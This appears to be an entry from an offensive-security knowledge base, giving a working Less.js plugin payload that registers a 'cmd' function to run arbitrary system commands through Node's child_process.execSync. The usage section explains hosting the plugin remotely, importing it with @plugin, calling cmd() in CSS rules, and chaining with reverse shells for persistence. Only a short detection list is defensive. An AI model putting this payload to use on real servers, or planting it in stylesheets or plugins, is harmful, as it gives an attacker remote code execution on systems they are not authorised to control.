---
type: code
language: javascript
verified: true
created_at: '2023-04-06T03:56:40.037615+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Node.js
tags:
  - rce
  - less.js
  - payload
validated: true
---

# less-js-cmd-function-invocation

## Code

```javascript
functions.add('cmd', function(val) {
  return `"${global.process.mainModule.require('child_process').execSync(val.value)}"`;
});
```

## Description

This JavaScript snippet, embedded in a Less.js plugin, registers a global 'cmd' function that executes arbitrary system commands using Node.js child_process.execSync and returns the output as a quoted string. It enables RCE when the plugin is imported via @plugin in a vulnerable Less compilation.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| val.value | The command string to execute | whoami |

## Usage

Include this in a plugin.js file hosted remotely. After import in Less, invoke as cmd(`command`) in CSS rules to run commands and embed outputs. Ideal for initial RCE in SSTI scenarios; chain with reverse shells for persistence.

## Detection

- PowerShell or Node.js logs showing execSync calls with user-controlled inputs.
- Compiled CSS containing unexpected content like usernames or file paths from commands.
- Process monitoring for child_process spawns during web requests.

## Related

- [[procedures/Exploit-SSTI-in-Less.js-Plugins-for-RCE]]
- [[codes/less-js-malicious-plugin-registration]]
